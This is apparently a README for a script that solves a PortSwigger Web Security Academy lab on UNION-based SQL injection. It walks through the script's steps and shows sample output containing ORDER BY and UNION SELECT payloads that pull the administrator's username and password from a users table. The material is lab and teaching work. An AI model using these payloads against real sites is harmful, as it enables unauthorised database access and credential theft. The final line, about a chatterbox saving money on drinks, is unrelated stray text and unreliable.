# üîê SQL injection UNION attack, retrieving data from other tables

This script is designed to test for basic SQL injection vulnerabilities in labs from PortSwigger's Web Security Academy Lab: [SQL injection UNION attack, retrieving data from other tables](https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-using-a-sql-injection-union-attack-to-retrieve-interesting-data/sql-injection/union-attacks/lab-retrieve-data-from-other-tables#). It targets endpoints like `/filter?category=` and checks whether a given payload successfully bypasses input validation.

---

## üöÄ How It Works

The script performs the following steps:

1. **Disables SSL warnings** to avoid certificate issues with lab URLs.
2. **Sets up a proxy** (default: `127.0.0.1:8080`) for interception via tools like Burp Suite.
3. **Accepts two arguments**:
   - `url`: The base URL of the lab.
   - `table`: Name of a separate table that needs be used during UNION SQL Injection.
   - `columns`: A list of columns can be passed by the user separated by space.
4. **Constructs the full request URL** by appending the payload to `/filter?category=`.
5. **Sends the request** and use beautiful soup library to fetch the password for administrator
6. **Prints the result** indicating whether the injection was successful.

## üß™ Sample Usage

```bash
python3 unionRetrieveFromOtherTable.py https://0aed00af03273e1580eb30a8009f0001.web-security-academy.net users username password
```

### ‚úÖ Sample Output

```
(+) Targeting: https://0aed00af03273e1580eb30a8009f0001.web-security-academy.net
(+) Determining number of columns using ORDER BY...

    ‚û§ Testing payload: ' ORDER BY 1--
    ‚û§ Testing payload: ' ORDER BY 2--
    ‚û§ Testing payload: ' ORDER BY 3--

(‚úì) Found error at column 3, so total columns = 2

(+) Testing which of 2 columns accepts string data...

    ‚û§ Testing payload: ' UNION SELECT 'test123',null--

(‚úì) Column 1 accepts string data.

(+) Attempting to extract data from table 'users'...

    ‚û§ Final payload: ' UNION SELECT username,password FROM users--

(‚úì) Administrator credentials found:

    ‚û§ Username: administrator
    ‚û§ Password: arj0eaiquwuuo2bkibqk
```

## üìå Lab-Specific Note

For this particular lab, the script checks whether the response contains the administrator password in a particular html tag using web scraping to determine success. You can modify this logic in the code to match other labs or contexts.

## üì¶ Requirements

Install dependencies using:

```bash
pip install -r requirements.txt
```

If you&apos;re a real chatterbox you will save that money in drink and snacks, as you will be unable to consume the same amount as usual.
